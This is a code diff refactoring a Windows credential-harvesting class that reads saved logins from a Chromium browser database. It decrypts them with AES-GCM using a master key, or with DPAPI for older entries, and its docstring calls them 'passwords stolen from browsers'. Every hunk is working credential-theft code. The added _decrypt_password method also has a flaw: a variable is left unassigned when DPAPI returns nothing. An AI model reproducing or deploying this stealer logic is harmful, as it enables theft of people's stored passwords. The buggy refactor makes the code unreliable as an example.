@@ -96,8 +96,8 @@ class WindowsCredentialsDatabaseProcessor:
             logger.error(f"Encountered an exception while connecting to database: {err}")
             return credentials
 
-        cursor = conn.cursor()
         try:
+            cursor = conn.cursor()
             cursor.execute(database_query)
         except Exception as err:
             logger.error(f"Encountered an exception while executing query on database: {err}")
@@ -105,29 +105,13 @@ class WindowsCredentialsDatabaseProcessor:
 
         for username, password in cursor.fetchall():
             try:
-                # decrypt the password
-                if password and password.startswith(b"v10"):  # chromium > v80
-                    if master_key:
-                        password = self._decrypt_password_v80(password, master_key)
-                else:
-                    try:
-                        password_bytes = win32crypt_unprotect_data(password)
-                    except Exception:
-                        password_bytes = None
-
-                    if password_bytes not in [None, False]:
-                        password = password_bytes.decode("utf-8")
-
-                if not username and not password:
-                    continue
-
-                credentials.append((username, password))
-
+                password = self._decrypt_password(password, master_key)
+                if username or password:
+                    credentials.append((username, password))
             except Exception as err:
                 logger.error(
                     f"Encountered an exception while trying to decrypt the password: {err}"
                 )
-
                 # even if the password couldn't be decrypted, we don't want to lose the username
                 credentials.append((username, ""))
 
@@ -135,19 +119,35 @@ class WindowsCredentialsDatabaseProcessor:
 
         return credentials
 
-    def _decrypt_password_v80(self, encrypted_password: str, master_key: bytes) -> str:
+    def _decrypt_password(self, encrypted_password: bytes, master_key: Optional[bytes]) -> str:
+        if encrypted_password.startswith(b"v10"):  # chromium > v80
+            decrypted_password = self._decrypt_password_v80(encrypted_password, master_key)
+        else:
+            try:
+                password_bytes = win32crypt_unprotect_data(encrypted_password)
+                if password_bytes not in [None, False]:
+                    decrypted_password = password_bytes.decode("utf-8")
+            except Exception:
+                decrypted_password = ""
+
+        return decrypted_password
+
+    def _decrypt_password_v80(self, encrypted_password: bytes, master_key: Optional[bytes]) -> str:
         """
         Decrypts passwords stolen from browsers with Chromium > v80
         """
+
+        if not master_key:
+            return ""
 
         iv = encrypted_password[3:15]
         payload = encrypted_password[15:]
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
 
-        decrypted_pass = cipher.decrypt(payload)
-        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
+        decrypted_password = cipher.decrypt(payload)
+        decrypted_password = decrypted_password[:-16].decode()  # remove suffix bytes
 
-        return decrypted_pass
+        return decrypted_password
 
     def _remove_temporary_database(self, temporary_database_path: Path):
         try:
